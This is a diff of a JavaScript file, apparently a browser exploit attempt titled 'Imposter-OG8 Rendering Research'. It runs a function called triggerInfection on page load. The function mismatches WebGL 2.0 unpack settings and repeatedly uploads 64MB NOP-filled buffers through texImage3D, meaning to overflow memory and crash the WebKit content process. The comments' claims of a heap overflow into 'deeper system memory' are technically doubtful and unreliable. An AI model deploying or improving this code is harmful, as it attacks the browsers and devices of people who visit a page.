@@ -1,52 +1,47 @@
 /**
- * Project: Imposter-OG8 Rendering Research
- * File: index.js
- * Description: Triggers a Heap Buffer Overflow via WebGL 2.0 
- * by mismatching UNPACK_IMAGE_HEIGHT and actual texImage3D dimensions.
+ * Project: Imposter-OG8 Rendering Research (Aggressive Mode)
+ * Description: Forces a WebKit WebContent process crash by creating 
+ * massive memory pressure and conflicting stride instructions.
  */
 
 (function() {
     const triggerInfection = () => {
-        console.log("Initializing Graphics Translator...");
-
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl2');
+        if (!gl) return;
 
-        if (!gl) {
-            console.error("WebGL 2.0 context failed. Device may be patched or incompatible.");
-            return;
-        }
+        console.log("System Instability Test: Initializing...");
 
-        // --- THE MISMATCHED INSTRUCTION ---
-        // Setting the deceptive memory instruction (The "Bucket" size)
-        const instructionHeight = 10;
-        gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, instructionHeight);
+        // 1. THE DECEPTIVE INSTRUCTION (Tiny Allocation)
+        gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, 1);
+        gl.pixelStorei(gl.UNPACK_SKIP_IMAGES, 1);
 
-        // --- THE OVERFLOW PAYLOAD ---
-        // Creating a buffer (100x100x100) that significantly exceeds the 10-pixel instruction
-        const actualSize = 100 * 100 * 100 * 4; 
-        const maliciousData = new Uint8Array(actualSize).fill(0x41); // Simulated payload
+        // 2. THE MASSIVE OVERFLOW (Huge Data)
+        // We use the maximum possible buffer to hit the 32-bit wrap-around limit
+        const pressureSize = 1024 * 1024 * 64; // 64MB per layer
+        const maliciousData = new Uint8Array(pressureSize).fill(0x90);
 
-        // --- THE TRIGGER ---
+        // 3. THE PRESSURE LOOP
+        // Instead of one call, we blast the driver with multiple calls
+        // to prevent the OS from "cleaning up" fast enough.
         const texture = gl.createTexture();
         gl.bindTexture(gl.TEXTURE_3D, texture);
 
-        console.log("Executing System Instability Event...");
+        let count = 0;
+        const blast = setInterval(() => {
+            console.log(`Blasting GPU... Iteration: ${++count}`);
+            
+            // This is the "Bridge" trigger
+            gl.texImage3D(
+                gl.TEXTURE_3D, 0, gl.RGBA8, 
+                2048, 2048, 128, // Massive Dimensions
+                0, gl.RGBA, gl.UNSIGNED_BYTE, 
+                maliciousData
+            );
 
-        // The system allocates for 10, but "pours" 100.
-        // This is where the "Scribble" occurs into deeper system memory.
-        gl.texImage3D(
-            gl.TEXTURE_3D, 
-            0, 
-            gl.RGBA8, 
-            100, 100, 100, // Actual Height (100) > instructionHeight (10)
-            0, 
-            gl.RGBA, 
-            gl.UNSIGNED_BYTE, 
-            maliciousData
-        );
+            if (count > 10) clearInterval(blast);
+        }, 50); // Every 50ms
     };
 
-    // Execute immediately when the window and graphics drivers are ready
     window.addEventListener('load', triggerInfection);
 })();
